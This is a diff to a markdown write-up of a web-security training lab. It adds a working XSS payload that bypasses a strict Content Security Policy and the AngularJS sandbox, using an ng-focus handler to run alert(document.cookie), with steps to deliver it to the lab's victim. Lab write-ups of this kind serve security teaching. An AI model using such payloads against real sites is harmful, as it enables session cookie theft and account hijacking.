@@ -10,7 +10,10 @@
 This lab shows how to bypass strict Content Security Policy (CSP) and AngularJS sandbox restrictions to execute JavaScript, specifically to alert the victim’s cookies. 
 
 ## 🛠 Payload Used 
-
+```sh
+location='https://0a03008c04079241805fd06d009200210.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+```
+Click Store and 'Deliver Exploit to victim'.
 
 ## 📖 Key Takeaways
 - **Focus event trigger**: The `ng-foucs` event is used to execute the payload when the element gain focus, making the attack automatic.
